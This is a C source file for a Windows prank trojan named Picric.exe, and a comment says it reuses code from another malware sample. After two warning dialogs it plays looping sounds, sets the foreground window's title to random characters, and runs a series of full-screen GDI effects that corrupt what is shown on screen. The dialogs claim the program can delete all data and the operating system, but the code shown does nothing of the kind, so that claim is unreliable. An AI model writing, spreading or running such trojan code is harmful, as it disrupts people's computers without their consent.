#include "main.h"
#include "sound.h"

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

/*

Some GDI in this malware SKID hydrogen.exe LAMO
Please forgive acetic for the confusion between
the src of hydrogen.exe and my own source code :)

...

SKID!!!111!11!!!!11!!111!!!!1!!!1111!!!111!!!!1

*/

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//Default GDI

DWORD WINAPI sound(LPVOID lpParam)
{
	while (1)
	{
		sound1();
		Sleep(30000);
		sound2();
		Sleep(30000);
		sound3();
		Sleep(30000);
	}
}

DWORD WINAPI garbled(LPVOID lpParam)
{
	int uVar1;
	HWND hWnd;
	int iVar2;
	uint uVar3;
	CHAR* lpString;
	CHAR local_9;
	do
	{
		iVar2 = 0;
		do
		{
			uVar1 = rdtsc();
			uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar3 = uVar3 ^ uVar3 << 0x11;
			(&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
			iVar2 = iVar2 + 1;
		}
		while (iVar2 < 0x46);
		lpString = &local_9;
		hWnd = GetForegroundWindow();
		SetWindowTextA(hWnd, lpString);
		Sleep(2500);
	}
	while (true);
}

void Payload(TROJAN_PAYLOAD payload, int nTime)
{
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++)
	{
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

void Shader(TROJAN_SHADER shader, int nTime)
{
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++)
	{
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

//GDI Designation

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//payload1

void gdi1(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			int randPixel = rand() % 25;
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 10) % 256, (prgbScreen[randPixel].r + j / 10) % 256, (prgbScreen[randPixel].r + 10));
		}
	}
}

//payload2

void gdi2(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + j / 10) % 250, (prgbScreen[i * w + j].r + i / 10) % 225, (prgbScreen[i * w + j].b + i) % 125);
		}
	}
}

//payload3

void gdi3(int t, int w, int h, PRGBQUAD prgbScreen)
{
	int randPixel = 5;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].b + j / 2) % 500, (prgbScreen[randPixel].r + i / 2) % 500, (prgbScreen[i * w + j].b + t) % 200);
		}
	}
}

//payload4

void gdi4(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			int temp1 = (i + 25);
			if (temp1 < 0)
			{
				temp1 = -temp1;
			}
			int temp2 = (j + rand() % 20);
			if (temp2 < 0)
			{
				temp2 = -temp2;
			}
			prgbScreen[i * w + j].rgb = prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
		}
	}
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((r) / 3, (g) / 3, (b) / 3) + (r)) % (RGB(255, 255, 255));
	}
}

//payload5

void gdi5(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 1) % 50, ((b) / 1 + t) % 50, ((r) / 1 + i) % 333) % (RGB(5, 5, 250)) + 10;
	}
}

//payload6

DWORD WINAPI gdi6_sab(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	POINT cursorPt;
	double moveangle = 0;
	while (1)
	{
		desk = GetDC(0);
		int ax = (int)(cos(moveangle) * 2.5);
		int ay = (int)(sin(moveangle) * 2.5);
		GetCursorPos(&cursorPt);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
		Ellipse(desk, cursorPt.x, cursorPt.y, cursorPt.x + 100, cursorPt.y + 100);
		Ellipse(desk, cursorPt.x + 10, cursorPt.y + 10, cursorPt.x + 90, cursorPt.y + 90);
		Ellipse(desk, cursorPt.x + 20, cursorPt.y + 20, cursorPt.x + 80, cursorPt.y + 80);
		Ellipse(desk, cursorPt.x + 30, cursorPt.y + 30, cursorPt.x + 70, cursorPt.y + 70);
		Ellipse(desk, cursorPt.x + 40, cursorPt.y + 40, cursorPt.x + 60, cursorPt.y + 60);
		Ellipse(desk, cursorPt.x + 50, cursorPt.y + 50, cursorPt.x + 50, cursorPt.y + 50);
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(25);
	}
}

void gdi6(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * r) % 256, (b + t) % 100, (g + i) % 256) + (i >> t / (r + 1)) / 5) % (RGB(500, 500, 200));
	}
	Sleep(25);
}

//payload7

void gdi7(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 1) % 250, ((b) / 1 + t) % 5, ((r) / 1 + i) % 250) % (RGB(5, 5, 250)) + 10;
	}
}

//payload8

void gdi8(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int randPixel = rand() % 25;
		int tempB = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB(GetBValue(prgbScreen[randPixel].rgb), int(sqrt(prgbScreen[randPixel].rgb)), (prgbScreen[randPixel].rgb));
		prgbScreen[randPixel].rgb = RGB(tempB, tempB, tempB);
	}
}

//payload9

void gdi9(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 100) % 100, int(sqrt((r)) / 25 + t) % 256, int(sqrt((r + g + b)) / 25 + i) % 256) % (RGB(5, 5, 40) * 5) + 10;
	}
}

//payload10

void gdi10(int t, int w, int h, PRGBQUAD prgbScreen)
{
	for (int i = 0; i < w * h; i++)
	{
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * g) % 150, (b + i) % 150, (r + i) % 150) + (i >> t / (r + 1)) / 333) % (RGB(150, 150, 150));
	}
	Sleep(25);
}

//payload11

void gdi11(int t, int w, int h, PRGBQUAD prgbScreen)
{
	t *= 1;
	for (int i = 0; i < h; i++)
	{
		for (int j = 0; j < w; j++)
		{
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].g + i / 1) % 250, (prgbScreen[i * w + j].r + j / 1) % 225, (prgbScreen[i * w + j].r + t) % 100);
		}
	}
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	//WARNING

	if (MessageBoxW(NULL, L"!!!WARNING!!!\n\nYou have ran a Trojan known as Picric.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Picric.exe - !!!WARNING!!! ", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	if (MessageBoxW(NULL, L"!!!FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue?\nThis is your final chance to stop this program from execution.", L"Picric.exe - !!!FINAL WARNING!!!", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;
	//Default GDI

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);

	CreateThread(0, 0, garbled, 0, 0, 0);
	CreateThread(0, 0, sound, 0, 0, 0);
	Shader(gdi1, 10);
	Shader(gdi2, 10);
	Shader(gdi3, 10);
	Shader(gdi4, 10);
	Shader(gdi5, 10);
	HANDLE payload6 = CreateThread(0, 0, gdi6_sab, 0, 0, 0);
	Shader(gdi6, 10);
	TerminateThread(payload6, 0);
	CloseHandle(payload6);
	RedrawWindow(0, 0, 0, 133);
	Shader(gdi7, 10);
	Shader(gdi8, 10);
	Shader(gdi9, 10);
	Shader(gdi10, 10);
	Shader(gdi11, 10);
	exit(1);
}